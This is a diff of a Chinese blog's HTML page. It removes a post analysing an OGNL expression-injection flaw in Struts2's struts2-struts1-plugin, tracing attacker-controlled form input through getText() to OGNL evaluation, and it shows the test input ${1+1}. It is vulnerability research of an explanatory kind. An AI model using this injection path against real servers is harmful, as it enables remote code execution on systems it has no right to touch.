-<p>从官方的漏洞描述我们可以知道，这个漏洞本质上是在struts2-struts1-plugin这个jar包上。这个库是用将struts1的action封装成struts2的action以便在strut2上使用。本质原因还是在struts2-struts1-plugin包中Struts1Action.java中execute函数调用了getText函数，这个函数会执行ognl表达式，更可恶的是getText的输入内容还是攻击者可控的。以下分析基于struts2的官方示例struts2-showcase war包。首先Struts1Action的execute方法代码如下，从红框中信息可以看出其实质是调用SaveGangsterAction.execute方法，然后再调用getText(msg.getKey()….)。<br><img src="/images/048-1.png" alt="1"><br>在struts2-showcase的integration模块下有SaveGangsterAction.java的execute方法的实现。具体如下：<br><img src="/images/048-2.png" alt="2"><br>在这个方法中就带入有毒参数gforn.getName()放到了messages结构中，而gform.getName()的值是从客户端获取的。Gangsterform.getName()的实现如下：<br><img src="/images/048-3.png" alt="3"><br>我们这里传入了${1+1}。有毒参数已经带入，就差ognl表达式。继续回到Struts1Action.java的execute方法下半部分，这里有getText()的入口，能清晰看到参数已经被污染，具体如下图：<br><img src="/images/048-4.png" alt="4"><br>下面进入getText的实现函数：这个调用栈比较深，首先我们给出栈图：<br><img src="/images/048-5.png" alt="5"><br>从Struts1action.execute函数开始，到ActionSupport的getText()方法，方法如下：<br><img src="/images/048-6.png" alt="6"><br>接着进入TextProviderSuppport.getText，接着调用其另一个重载类方法getText(),示例如下：<br><img src="/images/048-7.png" alt="7"><br>如图所示，进入LocalizeTextUtil.findText，继续分析其实现：从名字上也能看出其是根据用户的配置做一些本地化的操作。代码如下：<br><img src="/images/048-8.png" alt="8"><br>熟悉struts2的童鞋跟到这一步就能发现这就是一个很典型的ognl表达式入口，先是得到一个valueStack，再继续递归得到ognl表达式的值。这里不再描述，详情可参考官方链接：<a href="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/LocalizedTextUtil.html" target="_blank" rel="external">https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/LocalizedTextUtil.html</a><br>最后附上一个简单的测试用例图：<br><img src="/images/048-9.png" alt="9"><br><img src="/images/048-10.png" alt="10"></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2263,7 +2295,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-count">30</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2284,7 +2316,7 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/categories/index.html">
+              <a href="/tags/index.html">
                 <span class="site-state-item-count">109</span>
                 <span class="site-state-item-name">标签</span>
               </a>
